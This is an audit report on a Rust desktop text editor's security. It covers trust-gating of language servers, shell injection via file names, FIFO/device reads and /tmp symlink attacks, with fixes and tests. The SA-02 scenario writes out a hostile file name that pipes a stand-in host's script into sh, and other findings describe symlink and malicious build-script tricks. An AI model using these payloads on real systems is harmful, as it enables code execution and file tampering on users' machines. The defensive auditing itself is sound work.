# Security Audit Report

Project: Apex text editor, `main` at the time of writing (after commit `27392e1`).
Date: 13 October 2026. Mode: audit with fixes. Reviewer posture: assume breach,
every repository and file treated as attacker-supplied.

## 1. Executive Summary

Apex is a local, offline desktop editor in Rust (egui/eframe). It has no server,
accounts, web front end or stored credentials. Its attack surface is what a
user opens: files, folders and cloned repositories, plus two loopback
listeners (single-instance IPC and the per-job askpass relay) and the
programs it runs (git, gh, build tasks, language servers).

Overall posture after this audit is **good for a desktop editor**. The design
already had the right shape: trust gating for project-defined programs,
argv-only process spawning, atomic private writes, bounded parsers and no
custom cryptography. The audit nevertheless found one **High** issue and
three **Medium** issues, all now fixed and committed:

* **SA-01 (High):** language servers started in untrusted folders. Opening
  one `.rs` file from a hostile clone with rust-analyzer installed ran that
  project's build scripts. The workspace trust gate covered tasks and git
  but not language servers.
* **SA-02 (Medium):** the "Rust: run file" task spliced the file name into an
  `sh -c` string, so a file called `$(cmd).rs` ran `cmd`. It also built to a
  fixed path in shared `/tmp`.
* **SA-03 (Medium):** opening a symlink to `/dev/zero` or a FIFO read forever
  or hung the editor. A repository can ship such a symlink.
* **SA-04 (Medium, multi-user hosts):** printing wrote to a guessable `/tmp`
  directory reused with `create_dir_all`, open to a symlink attack.

Four Low issues were also fixed: weak token generation and comparison
(SA-06), option injection via ref names (SA-07), two git2 soundness advisories
(SA-08), and a predictable history-rewrite temp directory (SA-05). A
documentation inaccuracy about environment handling was corrected (SA-09).
Remaining open items are Low or Informational defence-in-depth issues
(SA-10 to SA-17).

There is no urgent outstanding fix. The main architectural concern is that
**trust is the single control** between a cloned repository and code
execution, so every new feature that runs a program must route through it.
That is the lesson of SA-01.

## 2. Scope Reviewed

* **Languages and frameworks:** Rust 2024 (six crates: `apex-buffer`,
  `apex-edit`, `apex-syntax`, `apex-project`, `apex-ui`, `apex-app`), egui
  and eframe 0.36, winit 0.30, wgpu, objc2 (macOS), libgit2 through `git2`,
  tree-sitter grammars (C), `rfd` (Linux and Windows dialogs).
* **Configuration:** workspace and crate `Cargo.toml`, `Cargo.lock` (512
  crates after the upgrade), `rust-toolchain.toml`, `.github/workflows/ci.yml`,
  `packaging/` (Linux, macOS, Windows build scripts, `Info.plist`).
* **Code paths:** file I/O, sessions and recovery, settings, themes, key map,
  project files, trust store, build tasks, LSP client, git reads (libgit2),
  git and gh jobs, askpass relay, history rewriting, forge links, IPC,
  macOS Apple Event handler and file panels, printing, URL opening.
* **Tests:** unit and property tests (182 at the start, 186 now), fuzz
  targets (`fuzz/fuzz_targets`), Xvfb end-to-end scripts in `tests/visual/`.
* **Not present:** no HTML, JavaScript, web server, database, container or
  cloud configuration.

## 3. Methodology

* **Static review** of every module that crosses a trust boundary, and
  every `unsafe` block.
* **Dependency review:** `cargo audit` against the RustSec database (1,307
  advisories). Lockfile inspection for CSPRNG availability.
* **Configuration review:** CI workflow, packaging scripts, plist, and how
  project files may override settings.
* **Threat modelling and attack-surface mapping** (section 5), starting
  from "the user clones a hostile repository and opens it".
* **Cryptography review:** token generation, comparison and transport.
* **Secrets lifecycle:** askpass answers, tokens, environment, logs.
* **Memory and resource safety:** `unsafe` and FFI, unbounded reads,
  parser depth (tested TOML and JSON to a depth of one million).
* **DoS analysis** of file loading, IPC, askpass, LSP framing, regex and
  previews.
* **Proof by execution:** the run-file injection was reproduced with the
  old quoting; the LSP gate was verified by running the real editor under
  Xvfb with a marker-writing fake server (`tests/visual/lsp-trust.sh`);
  the git2 upgrade was verified by the full Git end-to-end script (16
  checks).
* **Frontend review:** not applicable (no browser code); the egui dialogs
  that handle secrets were reviewed instead.

## 4. Risk Rating Method

Severity combines impact and the attacker capability needed:

* **Critical:** remote code execution or credential theft with no user
  action.
* **High:** code execution or data loss from an ordinary user action on
  attacker content (for example, opening a file from a cloned repository).
* **Medium:** code execution needing an unusual but plausible user action, a
  denial of service from attacker content, or a local attack by another
  user on a shared host.
* **Low:** defence in depth, issues needing local code execution as the
  same user, or theoretical issues in dependencies not reached by Apex.
* **Informational:** accepted design trade-offs and hardening ideas.

Confidence is **High** when reproduced or proven from the code path,
**Medium** when inferred from code with one unverified assumption, **Low**
when it depends on behaviour outside this repository.

## 5. Attack Surface Map

| Entry point | Data from | Trust boundary | Control |
|---|---|---|---|
| Opening files and folders | any file, symlink, device | file content and type | bounded load, binary detection, regular files only (SA-03) |
| Project file `*.apex-project.toml` | repository | settings and tasks | `lsp_servers` stripped; tasks need trust |
| Build tasks | detected or project file | runs programs | trust for project tasks; argv only |
| Language servers | user settings, PATH | runs programs on the folder | **trust (SA-01, new)** |
| `git` and `gh` jobs | repository config and hooks | runs programs | trust; argv; `--` before paths and refs |
| Askpass relay | git, ssh, any local process | loopback TCP | per-job CSPRNG token, constant-time compare, 64 KiB cap |
| Single-instance IPC | any local process | loopback TCP | CSPRNG token in a private runtime file, 1 MiB cap, timeouts |
| macOS Apple Events | same-session apps | open-file requests | platform behaviour; open only |
| Remote links | repository remote URL | browser | `https://` only, path percent-encoded |
| Temporary files | shared `/tmp` | other local users | fresh, unguessable, 0700 (SA-04, SA-05) |
| Language server output | server process | JSON-RPC | size limit, clamped positions, edits confirmed |

**Attacker starting positions considered:** author of a repository or archive
the user opens; another local user on a shared host; a local process
running as the same user (post-compromise); a compromised dependency.

## 6. Findings Summary Table

| ID | Severity | Confidence | Title | Component | Status |
|---|---|---|---|---|---|
| SA-01 | High | High | Language servers start in untrusted folders | `apex-ui/src/lsp_ui.rs` | Fixed (`a63d7bd`) |
| SA-02 | Medium | High | Shell injection through the file name in "Rust: run file"; fixed `/tmp` binary | `apex-project/src/tasks.rs` | Fixed (`a63d7bd`) |
| SA-03 | Medium | High | Devices and FIFOs read without bound or block the editor | `apex-project/src/fileio.rs` | Fixed (`9a1e5ca`) |
| SA-04 | Medium | High | Print temp directory open to symlink attack | `apex-ui/src/app.rs` | Fixed (`9a1e5ca`, `27392e1`) |
| SA-05 | Low | Medium | Predictable history-rewrite script directory | `apex-project/src/git_history.rs` | Fixed (`27392e1`) |
| SA-06 | Low | High | Tokens not from a CSPRNG; askpass compare not constant time; unbounded askpass read | `ipc.rs`, `git_cli.rs` | Fixed (`a63d7bd`) |
| SA-07 | Low | High | Repository ref names parsed as git options | `apex-ui/src/git_branches.rs` | Fixed (`9a1e5ca`) |
| SA-08 | Low | High | git2 0.20 soundness advisories | dependency `git2` | Fixed (`3d0d5a1`) |
| SA-09 | Low | High | Documentation claimed task environments drop the editor's secrets | docs, `tasks.rs` | Fixed (docs); behaviour accepted |
| SA-10 | Low | High | Credentials in memory are not wiped | askpass dialog and relay | Open |
| SA-11 | Low | High | CI actions pinned by tag, not commit | `.github/workflows/ci.yml` | Open (audit step added) |
| SA-12 | Informational | High | Trust is by path prefix and not canonicalised | `apex-ui/src/tasks_ui.rs` | Open |
| SA-13 | Informational | High | Recovery snapshots are plaintext at rest | `apex-project/src/session.rs` | Accepted |
| SA-14 | Informational | High | Remote links use a repository-supplied host | `apex-project/src/forge.rs` | Accepted |
| SA-15 | Informational | Medium | Windows runtime directory relies on profile ACLs | `apex-project/src/paths.rs` | Accepted |
| SA-16 | Informational | High | Files up to 2 GiB load fully into memory | `apex-project/src/fileio.rs` | Accepted |
| SA-17 | Informational | High | Release artefacts are ad hoc signed or unsigned | `packaging/` | Open |

## 7. Detailed Findings

### Finding ID: SA-01

#### Title
Language servers start in untrusted folders, running repository code.

#### Severity
High

#### Confidence
High

#### Affected Files / Components
`crates/apex-ui/src/lsp_ui.rs`, `ensure_client` (now line 190; gate at line 210).

#### Description
`ensure_client` started a server for any open document whose language had a
configured server or a known one on `PATH`. It never consulted the
workspace trust store that gates build tasks and git. Language servers act
on the whole folder. rust-analyzer runs `cargo metadata` and `cargo check`,
which execute `build.rs`, procedural macros and the repository's
`.cargo/config.toml` (which can name a `rustc` wrapper). gopls runs
`go list`, and other servers read project configuration that can name
programs.

#### Evidence
Before the fix:
```rust
let Some(cfg) = self.lsp_config_for(&key.1) else { return false };
match LspClient::start(cfg, &key.0) {
```
No `self.trust` check on this path. `SECURITY.md` claimed language servers
needed trust; the code did not enforce it.

#### Attack Scenario
An attacker publishes a repository whose `build.rs` runs a payload. The
victim clones it and opens any `.rs` file in Apex. rust-analyzer is on
`PATH` (common for Rust developers). The server starts automatically and
runs `cargo check`, executing `build.rs` as the victim.

#### Impact
Arbitrary code execution as the user, from the ordinary action of opening a
file. This bypasses the trust model the rest of the editor relies on.

#### Recommendation
Start a server only when its root is trusted. Show a one-time status message
otherwise, and start the server as soon as trust is granted.

#### Safer Example
```rust
if !self.trust.is_trusted(&key.0) {
    if self.lsp.untrusted_reported.insert(key.0.clone()) {
        self.set_status(format!("{} language server not started: this folder is not trusted (Project > Trust Workspace)", cfg.command[0]), false);
    }
    return false;
}
```

#### Suggested Tests
`tests/visual/lsp-trust.sh` (added) runs the real editor under Xvfb with a fake
server that only creates a marker file. With the folder untrusted, no
marker may appear. With the folder trusted, the marker must appear. Both
checks passed. A headless `ApexApp` constructor would allow this as a unit
test (see the functionality report).

#### References
CWE-494, CWE-829 (inclusion of functionality from an untrusted control
sphere); OWASP Top 10 A08:2021. Comparable control: VS Code Workspace Trust
(Restricted Mode).

#### Assumptions / Limitations
Needs a server on `PATH` or configured by the user. Trusting a folder still
lets its code run, by design.

### Finding ID: SA-02

#### Title
Shell injection through the file name in "Rust: run file", and a fixed `/tmp` binary.

#### Severity
Medium

#### Confidence
High (reproduced)

#### Affected Files / Components
`crates/apex-project/src/tasks.rs`, `task_for_file` (line 121), new `rust_run_command` (line 142).

#### Description
The task was
`sh -c "rustc {path:?} -o /tmp/apex-run && /tmp/apex-run"`. `{:?}` produces a
Rust string literal in double quotes. Inside double quotes the shell still
expands `$(...)` and backticks. The binary also went to a fixed name in the
shared `/tmp`.

#### Evidence
Reproduced in a scratch directory: `sh -c 'true "/x/$(touch pwned).rs"'` creates
`pwned`. Detected tasks run without a trust prompt.

#### Attack Scenario
A repository contains `examples/$(curl -s evil.sh|sh).rs` with harmless
content. The user opens it, sees a two-line program, and runs it with
**Build**. The file name is executed by the shell. Separately, on a shared
host, another user can pre-create `/tmp/apex-run` with permissive mode and
replace its contents between compile and run.

#### Impact
Code execution beyond what the user reviewed (the file name rather than its
contents). Local privilege crossing on multi-user hosts.

#### Recommendation
Pass paths as positional parameters and build into the user's data directory.

#### Safer Example
```rust
let script = r#"mkdir -p "$(dirname "$2")" && rustc "$1" -o "$2" && "$2""#;
vec!["sh".into(), "-c".into(), script.into(), "sh".into(), src, out]
```

#### Suggested Tests
`tasks::tests::run_file_does_not_interpret_the_file_name` (added): a file named
`$(touch pwned).rs` must not create `pwned`.

#### References
CWE-78 (OS command injection), CWE-377 (insecure temporary file).

#### Assumptions / Limitations
Needs the user to run the file. Windows has no `sh`, so this task does not
work there; that is unchanged.

### Finding ID: SA-03

#### Title
Devices and FIFOs read without bound or block the editor.

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`crates/apex-project/src/fileio.rs`, `load` (lines 96 to 111).

#### Description
`load` checked `metadata.len()` against `MAX_FILE_BYTES`, then called
`read_to_end`. Character devices and FIFOs report size 0, and `metadata`
follows symlinks. `/dev/zero` never ends; a FIFO blocks until a writer
appears. The read was not bounded, so a file that grew after the check
could also exceed the limit.

#### Evidence
```rust
if md.len() > MAX_FILE_BYTES { ... }
File::open(path)?.read_to_end(&mut bytes)?;
```

#### Attack Scenario
A repository includes `README` as a symlink to `/dev/zero`. Clicking it in the
sidebar exhausts memory. A symlink to a FIFO hangs the caller.

#### Impact
Crash or hang of the editor from one click on repository content. Recovery
snapshots limit lost work to a few seconds.

#### Recommendation
Refuse anything that is not a regular file, and cap the read.

#### Safer Example
```rust
if !md.is_file() { return Err(FileError::NotRegular(path.to_path_buf())); }
File::open(path)?.take(MAX_FILE_BYTES + 1).read_to_end(&mut bytes)?;
```

#### Suggested Tests
`fileio::tests::refuses_devices_and_fifos_even_through_symlinks` (added).

#### References
CWE-400, CWE-835, CWE-59.

#### Assumptions / Limitations
Unix-specific trigger. On Windows, device paths are less reachable from a
repository.

### Finding ID: SA-04

#### Title
Print temp directory open to a symlink attack.

#### Severity
Medium (only on hosts shared with other users)

#### Confidence
High

#### Affected Files / Components
`crates/apex-ui/src/app.rs`, `print_text` and new `private_temp_file` (line 4203).

#### Description
Printing wrote the document to `/tmp/apex-print-<pid>/<title>.txt`, created
with `create_dir_all` (succeeds if the directory exists) and `File::create`
(follows symlinks, truncates).

#### Evidence
```rust
let dir = std::env::temp_dir().join(format!("apex-print-{}", std::process::id()));
std::fs::create_dir_all(&dir)?;
let mut f = std::fs::File::create(&path)?;
```

#### Attack Scenario
Another local user creates `/tmp/apex-print-<pid>` for likely PIDs and places
`notes.txt` as a symlink to the victim's `~/.bashrc`. When the victim prints
`notes.txt`, Apex overwrites `~/.bashrc` with the document text.

#### Impact
Overwrite of any file the victim can write. With crafted document text,
this can lead to code execution as the victim.

#### Recommendation
Use a fresh, unguessable, owner-only directory that must not already exist,
and open the file with `create_new`.

#### Safer Example
`paths::private_temp_dir` (random 64-bit suffix from the OS random source,
`DirBuilder::create`, mode `0700`), then `OpenOptions::new().create_new(true)`.

#### Suggested Tests
`app::tests::print_temp_file_is_fresh_and_private` and
`paths::tests::private_temp_dirs_are_fresh_and_owner_only` (added).

#### References
CWE-59, CWE-377.

#### Assumptions / Limitations
Needs a second local account and a sticky, shared `/tmp`.

### Finding ID: SA-05

#### Title
Predictable history-rewrite script directory.

#### Severity
Low

#### Confidence
Medium

#### Affected Files / Components
`crates/apex-project/src/git_history.rs`, `apply` (line 517).

#### Description
The `filter-branch` scripts went to `/tmp/apex-rewrite-<pid>-<seconds>`,
checked with `ensure_private_dir`, which follows symlinks. Analysis shows it
fails closed for attacker-owned directories. A planted symlink to one of
the victim's own private directories would pass, and the scripts would be
written there. `remove_dir_all` would then remove only the link and leave
the files behind.

#### Evidence
Former code: `std::env::temp_dir().join(format!("apex-rewrite-{}-{stamp}", ...))`.

#### Attack Scenario
Another local user points the predicted name at the victim's private
directory. Apex writes `env-filter.sh` and message files there. The impact
is limited: no existing file is overwritten and the scripts are Apex's own.

#### Impact
Stray files in a victim directory; no confirmed code execution.

#### Recommendation and Safer Example
`paths::private_temp_dir("apex-rewrite")` (as for SA-04).

#### Suggested Tests
Covered by the `private_temp_dir` test. The history-rewrite tests still pass,
and the Git end-to-end run ended "all git checks passed".

#### References
CWE-377.

#### Assumptions / Limitations
Multi-user host only.

### Finding ID: SA-06

#### Title
Tokens not from a CSPRNG; non-constant-time askpass comparison; unbounded askpass read.

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`crates/apex-app/src/ipc.rs` (`serve`, `handle`), `crates/apex-project/src/git_cli.rs` (`askpass_server`), new `crates/apex-project/src/token.rs`.

#### Description
Both tokens were SipHash-1-3 outputs (std `RandomState`) of the pid, a salt and
the time. The keys are random, but SipHash-1-3 in std is a hash-flooding
defence, not a vetted PRF for secrets. The askpass token was compared with
`!=`, and `read_line` read without a limit.

#### Evidence
`s.hash_one((std::process::id(), salt, Instant::now()))` and
`tok.trim_end() != expected`.

#### Attack Scenario
A local process tries to reach the askpass listener during a push to inject a
prompt or read a credential reply. It cannot realistically guess a token
either way, but it could stream unbounded data into the listener.

#### Impact
Defence in depth only. Memory growth in the askpass thread was the
practical issue.

#### Recommendation and Safer Example
256 bits from `getrandom::fill`, `tokens_equal` (length check, then a
fold over XORs), `BufReader::new((&stream).take(64 * 1024))`. If no OS random
source is available, Apex now fails closed and starts no listener.

#### Suggested Tests
`token::tests::tokens_are_random_hex_and_compare_exactly` (added), plus the
existing IPC round-trip and askpass `git credential fill` tests (both pass).

#### References
CWE-330, CWE-208, CWE-400.

#### Assumptions / Limitations
Loopback only; a same-user process can read the instance file anyway.

### Finding ID: SA-07

#### Title
Repository ref names parsed as git options.

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`crates/apex-ui/src/git_branches.rs`: switch (line 165), branch delete (234), merge (247).

#### Description
Branch names from `git_repo::branches` (local and remote refs) went straight
after the subcommand. A fetched remote branch such as `--orphan=x` is a valid
ref. Choosing it in **Switch Branch** would run `git switch --orphan=x`,
which clears tracked files from the working tree.

#### Evidence
`git check-ref-format refs/heads/-x` returns success, and `git switch -- -x`
works. These were checked in a scratch repository.

#### Attack Scenario
A remote publishes a branch named `--orphan=main2`. The victim fetches it and
clicks it in the branch list.

#### Impact
Confusing destructive-looking state (files recoverable from HEAD); no code
execution found.

#### Recommendation and Safer Example
`["switch", "--", &name]`, `["switch", "--track", "--", &name]`,
`["branch", "-d", "--", &name]`, `["merge", "--no-edit", "--", &name]`.

#### Suggested Tests
The Git end-to-end script exercises switch, merge and delete (all pass). A
unit test needs the headless app harness.

#### References
CWE-88 (argument injection).

#### Assumptions / Limitations
Commit ids for cherry-pick and revert come from the log as hex and were left
as they are.

### Finding ID: SA-08

#### Title
git2 0.20 soundness advisories.

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
Dependency `git2` 0.20.4 (RUSTSEC-2026-0183 `Remote::list` null slice;
RUSTSEC-2026-0184 null signatures from `blame_buffer` hunks).

#### Description
Apex calls `blame_buffer` (`git.rs`, `blame`), but reads only
`final_commit_id`, `final_start_line` and `lines_in_hunk`, not the affected
signature accessors. It does not call `Remote::list`. The UB was therefore
not reached, but the crate was unsound.

#### Evidence
`cargo audit` reported both advisories; after the upgrade it reports none.

#### Impact
None observed. Future code could have hit undefined behaviour.

#### Recommendation
Upgrade to git2 0.21. Its accessors now return `Result` for non-UTF-8 data,
and Apex now skips such names instead of misreading them.

#### Suggested Tests
Workspace tests and the Git end-to-end script (16 checks) pass on 0.21.

#### References
RUSTSEC-2026-0183, RUSTSEC-2026-0184; CWE-476.

#### Assumptions / Limitations
None.

### Finding ID: SA-09

#### Title
Documentation claimed task environments drop the editor's secrets.

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`docs/user-guide/build-tasks.md`, the `TaskDef::env` doc comment in `crates/apex-project/src/tasks.rs`, the LaTeX guide.

#### Description
The docs said "the editor's own environment secrets are not forwarded".
`tasks::run` (line 320) does not clear the environment. It only refuses
`LD_*`, `DYLD_*`, `BASH_ENV` and `ENV` keys in the task's own `env`. A user
relying on the docs could start Apex with secrets in its environment and
expect a project task not to see them.

#### Impact
False sense of isolation for trusted project tasks.

#### Recommendation
Correct the docs (done). Inheriting the environment matches terminals and
other editors and is needed for `PATH`, `HOME` and toolchains, so the
behaviour is accepted.

#### Safer Example
Users who need isolation can start Apex from a clean environment
(`env -i HOME=$HOME PATH=$PATH apex`).

#### Suggested Tests
None needed for docs.

#### References
CWE-526.

#### Assumptions / Limitations
Only trusted tasks run, so the exposure is to code the user already trusted.

### Finding ID: SA-10

#### Title
Credentials in memory are not wiped.

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`crates/apex-ui/src/workspace_ui.rs`, `Dialog::Askpass` (line 2035); the
`git_cli.rs` askpass relay; `askpass_client` (line 405).

#### Description
A password or passphrase typed into the askpass dialog lives in an egui
`String`, is moved through a channel, formatted into `OK <answer>\n` and
written to the socket. None of these copies is zeroised. Rust `String` drops
do not wipe memory, and egui may keep copies (undo state of the text edit).

#### Evidence
`done = Some(Some(std::mem::take(&mut text)))`, then
`format!("OK {}\n", a.replace(['\n', '\r'], ""))`.

#### Attack Scenario
Post-compromise: a process able to read Apex's memory, a core dump or swap
recovers a recent git password.

#### Impact
Credential disclosure only after local compromise. There is no heap-dump
endpoint or crash reporter, which keeps this Low.

#### Recommendation
Use `zeroize::Zeroizing<String>` for the answer and reply buffers, and clear
the dialog's text before drop. Accept that egui's internal copies are
best-effort. Consider `prctl(PR_SET_DUMPABLE, 0)` while a prompt is open.

#### Safer Example
```rust
let reply = zeroize::Zeroizing::new(format!("OK {}\n", answer));
```

#### Suggested Tests
None practical beyond code review.

#### References
CWE-316, CWE-226.

#### Assumptions / Limitations
Credentials live for seconds; the main control is that Apex never stores them.

### Finding ID: SA-11

#### Title
CI actions pinned by tag, not commit.

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`.github/workflows/ci.yml`: `actions/checkout@v4`, `dtolnay/rust-toolchain@stable`,
`Swatinem/rust-cache@v2`, `actions/upload-artifact@v4`.

#### Description
Tags can be moved by the action owner or an attacker who compromises them,
which changes what CI runs. CI has no secrets today, so the impact is
limited to tampered build artefacts.

#### Recommendation
Pin each action to a full commit SHA with the tag in a comment. Dependabot
can keep them current. A `cargo audit` step was added in this pass.

#### Safer Example
`uses: actions/checkout@<40-hex-sha> # v4`

#### Suggested Tests
Not applicable.

#### References
CWE-829; OpenSSF Scorecard "Pinned-Dependencies".

#### Assumptions / Limitations
CI is currently blocked by GitHub billing, so nothing runs at all.

### Finding ID: SA-12

#### Title
Trust is by path prefix and not canonicalised.

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`crates/apex-ui/src/tasks_ui.rs`, `TrustStore::is_trusted` (line 105).

#### Description
`root.starts_with(t)` means trusting `~/src` trusts every repository under it,
including ones cloned later. Paths are compared as given, so a folder
reached through a symlink may need trusting separately.

#### Recommendation
Say in the Trust dialog that subfolders are included, or store exact roots
only. Canonicalise before storing and checking.

#### Suggested Tests
Unit test on `TrustStore` with nested and symlinked paths.

#### References
CWE-41.

#### Assumptions / Limitations
User choice.

### Finding ID: SA-13

#### Title
Recovery snapshots are plaintext at rest.

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`crates/apex-project/src/session.rs`, `write_private` (line 122).

#### Description
Unsaved text is written to `recovery/` with mode `0600` in a `0700`
directory. It is not encrypted, so backups of the home directory include
it.

#### Recommendation
Document it; offer a setting to disable recovery for sensitive work.

#### References
CWE-312.

#### Assumptions / Limitations
Same protection as the user's own files.

### Finding ID: SA-14

#### Title
Remote links use a repository-supplied host.

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`crates/apex-project/src/forge.rs`, `web_repo`; `crates/apex-ui/src/app.rs`, `open_url` (line 4573).

#### Description
A repository's `origin` can point at any host, so **Open on Remote** may open a
look-alike site. Only `https://` URLs are opened, as a single argument with
no shell. This is the same as any git client's "open on web".

#### Recommendation
Show the host in the status bar when opening a link.

#### References
CWE-601 (analogous).

### Finding ID: SA-15

#### Title
Windows runtime directory relies on profile ACLs.

#### Severity
Informational

#### Confidence
Medium

#### Affected Files / Components
`crates/apex-project/src/paths.rs`, `ensure_private_dir`.

#### Description
On Windows, mode bits are not applied. The instance file's protection comes
from the user profile's default ACLs. This was already listed in
`docs/security/review.md`.

#### Recommendation
Set an explicit owner-only DACL, or use a named pipe with a security
descriptor.

### Finding ID: SA-16

#### Title
Files up to 2 GiB load fully into memory.

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`crates/apex-project/src/fileio.rs`, `MAX_FILE_BYTES` (line 34).

#### Description
The user must choose to open such a file, and large-file mode keeps the
interface responsive. Memory use equals the file size.

#### Recommendation
A memory-mapped or paged mode for huge files (already a known limitation).

### Finding ID: SA-17

#### Title
Release artefacts are ad hoc signed or unsigned.

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`packaging/macos/build.sh` (ad hoc `codesign --sign -` unless
`APEX_SIGN_IDENTITY` is set), Windows installer (no Authenticode step).

#### Description
Users cannot verify that a downloaded build came from the project.

#### Recommendation
Sign with a Developer ID, notarise and staple (the steps are already in
`packaging/macos/README.md`). Sign the Windows installer and publish SHA-256
checksums with each release.

## 8. Blackhat-Style Abuse Paths

1. **"Just look at my repo" (SA-01, now closed).** Publish a Rust repository
   with a malicious `build.rs` and ask someone to review it. In Apex before
   this audit, opening `src/lib.rs` was enough with rust-analyzer installed.
   **Breakpoint now:** the trust gate; the status bar explains why the
   server did not start.
2. **Weaponised file name (SA-02, closed).** Hide `$(…)` in an example's
   file name and suggest "run the example". **Breakpoint:** positional
   shell parameters.
3. **Sidebar landmine (SA-03, closed).** Ship `docs/README` as a symlink to
   `/dev/zero`; the reviewer's editor dies on click. **Breakpoint:** regular
   files only, bounded read.
4. **Shared build server (SA-04 and SA-05, closed).** Plant `/tmp`
   directories for predictable names and wait for a colleague to print or
   rewrite history. **Breakpoint:** fresh random `0700` directories with
   `create_new`.
5. **Trusted repository, still dangerous.** Once a folder is trusted, its
   git hooks, `core.fsmonitor`, build scripts and tasks run when Apex runs
   them. This is inherent and documented. **Breakpoint:** the trust prompt
   itself; SA-12 suggests making its scope clearer.
6. **Same-user local malware.** It can read the IPC token and ask Apex to
   open files, or read process memory for recent credentials (SA-10). Apex
   cannot defend against a same-user attacker; the gains are small (no
   stored secrets, no command execution through IPC).

## 9. Denial-of-Service and Resource Exhaustion Review

| Vector | Trigger | Control | Result |
|---|---|---|---|
| Device or FIFO file | symlink to `/dev/zero` | regular files only, bounded read | fixed (SA-03) |
| Huge file | 2 GiB text file | size limit, large-file mode | accepted (SA-16) |
| Deeply nested TOML or JSON | `a = [[[[…]]]]` | parsers' recursion limits | tested to depth 1,000,000: clean error, no crash |
| Regex from the find bar or tasks | catastrophic pattern | Rust `regex` is linear time; size and DFA limits | verified absent |
| LSP flood | huge `Content-Length` | message size limit, disconnect | present (`lsp.rs` line 382) |
| IPC flood | endless line | 1 MiB cap, 5 s timeout, token | present |
| Askpass flood | endless line | 64 KiB cap, 10 s timeout | fixed (SA-06) |
| Git output | huge log | GIT tab capped at 5,000 lines | present |
| Build output | chatty build | bounded channels, 20,000-line panel cap | present |
| Hex preview | large binary | display capped at 1 MiB | present |
| Long lines | multi-megabyte line | shaping capped (`MAX_LAYOUT_CHARS`) | present |

## 10. Cryptography and Key Management Review

* **No encryption, signing, password hashing or key storage** exists in Apex.
  TLS and SSH are handled entirely by the user's `git`, `ssh` and `gh`, so
  their verification settings apply. Apex never disables verification.
* **Randomness:** authentication tokens now come from `getrandom` (OS
  CSPRNG, 256 bits). `fastrand` is used only for the history editor's date
  spreading, which is not security-relevant. That is correct use.
* **Comparison:** IPC and askpass tokens use the same constant-time
  `tokens_equal`.
* **Hand-rolled crypto:** none.
* **Post-quantum:** not applicable. Apex holds no long-lived confidential
  data in transit. Transport security is git's and ssh's, and OpenSSH
  already defaults to a hybrid post-quantum key exchange.

## 11. Secrets Lifecycle and In-Memory Credential Review

* **At rest:** no credentials are stored. `trusted.json`, sessions and
  recovery files are private (`0600` in `0700` directories on Unix). There
  are no secrets in the repository; a grep for keys and tokens found only
  test fixtures (`s3cret` in the askpass test, `token@github.com` in a URL
  parsing test).
* **In transit:** askpass answers travel over loopback TCP once, after a
  token check, then are printed to git on stdout. They are never put on
  command lines or in URLs, and never logged. The GIT tab logs commands,
  not stdin. Remote URLs with embedded tokens (`https://token@host/...`)
  are stripped of user info when building web links (`forge.rs` test).
* **Environment:** the askpass port and token reach git through environment
  variables of that one child process tree. They are per job and useless
  after it.
* **In memory:** see SA-10. There is no heap-dump endpoint, debug server or
  crash reporter, and logging goes to stderr only.

## 12. Memory and Resource Safety Review

`unsafe` blocks reviewed (seven files):

* `git_cli.rs`: `pre_exec(setsid)` is async-signal-safe.
* `tasks.rs`: `killpg`. The child is not reaped before the call, so its PID
  cannot be reused.
* `fileio.rs`: `access`, `chown` on valid C strings.
* `app.rs`: `localtime_r` into `MaybeUninit`, read only on success.
* `macos.rs`, `macos_dialogs.rs`: objc2 message sends with documented
  types. Blocks are copied by CoreFoundation. The panel and handler
  avoid a retain cycle.
* Tests: `set_var`.

All are sound. FFI to libgit2 and tree-sitter is through maintained crates.
Unbounded growth was found only in the askpass read and device loading,
both now fixed. Panic sites outside tests (32) are invariant checks on
maps the code just populated and on compiled-in constants, not on input.

## 13. Dependency and Supply-Chain Review

* `cargo audit`: two advisories (git2) before; **zero after** the upgrade.
* All crates come from crates.io, and libgit2 is vendored. The lockfile is
  committed. No build script downloads anything. Packaging uses local
  tools (`appimagetool` only if installed).
* New dependency: `getrandom` 0.3, already in the tree through other crates.
* CI: SA-11 (tag pinning). `cargo install cargo-fuzz --locked` and
  `cargo-audit --locked` use locked versions.

## 14. Authentication and Authorisation Review

There are no users or roles. The "authorisation" decision is **workspace
trust**, and every program-running path now checks it:

* git jobs (`git_trusted`, branch, panel, history)
* gh (`gh_ready`, `forge_refresh_pr`)
* auto-fetch
* project tasks
* language servers (new)

IPC and askpass authenticate with tokens (SA-06). The Apple Event handler
accepts only open-file requests.

## 15. Input Validation and Output Encoding Review

* **Process arguments** are always argv. `--` separates paths and now ref
  names. Commit messages and patches go through stdin. The filter-branch
  scripts single-quote every value (`sh_quote`). The run-file task now uses
  positional parameters.
* **Output** from builds and git is stripped of ANSI and OSC sequences
  before display.
* **URLs:** `https://` only, path segments percent-encoded.
* **Branch names** are validated before create and rename.
* **Settings, themes and key maps** are validated with diagnostics, and the
  project settings strip `lsp_servers`.

## 16. Frontend HTML/JavaScript Robustness Review

Not applicable: Apex has no HTML, JavaScript or browser component. The
equivalent UI concerns were reviewed. Dialogs that take secrets mask
password and passphrase prompts. Escape cancels and sends `None` so git
stops waiting. Destructive git actions ask first.

## 17. Infrastructure and Deployment Review

No containers, servers or cloud configuration. The release artefacts are
covered by SA-17. The macOS bundle declares no entitlements and uses no
sandbox, which is appropriate for an editor that opens arbitrary paths but
means no OS-level confinement.

## 18. Logging, Monitoring, and Error Handling Review

Logs go to stderr only, at `warn` by default. There is no telemetry or crash
upload. The GIT tab shows commands and their output; credentials never
appear there. Git errors are reduced to the `fatal:` or `error:` line. A
damaged session is renamed aside rather than blocking start-up. Background
job panics are contained by their threads.

## 19. Test Coverage and Security Regression Gaps

Added in this pass:
* `fileio::refuses_devices_and_fifos_even_through_symlinks`
* `tasks::run_file_does_not_interpret_the_file_name`
* `token::tokens_are_random_hex_and_compare_exactly`
* `paths::private_temp_dirs_are_fresh_and_owner_only`
